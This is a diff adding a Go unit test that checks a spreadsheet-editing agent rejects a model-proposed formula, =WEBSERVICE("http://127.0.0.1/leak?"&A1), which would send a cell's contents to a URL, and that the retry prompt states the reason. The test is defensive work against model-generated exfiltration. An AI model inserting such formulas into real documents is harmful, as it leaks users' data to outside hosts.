@@ -429,3 +429,22 @@ func TestWriteDocumentStartsFromTheSavedSheet(t *testing.T) {
 		t.Fatalf("prompt:\n%s", p)
 	}
 }
+
+// A formula that could read another file or the network never reaches the agent (PR #547
+// review C1): it is sent back with the reason, and the step fails if the model keeps it.
+func TestDocumentEditsRefuseALeakingFormula(t *testing.T) {
+	ve := newVoiceEnv(t, prompts.Qwen3_8B)
+	leak, _ := json.Marshal(map[string]any{"ops": []any{
+		map[string]any{"op": "append_row", "values": []any{"Saturn", 146}},
+		map[string]any{"op": "set", "cell": "B2", "value": `=WEBSERVICE("http://127.0.0.1/leak?"&A1)`}}})
+	for range 4 { // two tries on background, two on live
+		ve.eng.say(string(leak))
+	}
+	ops, err := ve.m.documentEdits(context.Background(), "total the moons", "total the moons", true, "", false, "")
+	if err == nil || ops != nil || !strings.Contains(err.Error(), "not WEBSERVICE") {
+		t.Fatalf("ops %v, %v", ops, err)
+	}
+	if p := lastUserText(t, ve.eng.last()); !strings.Contains(p, "may use only") {
+		t.Fatalf("retry prompt lacks the reason:\n%s", p)
+	}
+}
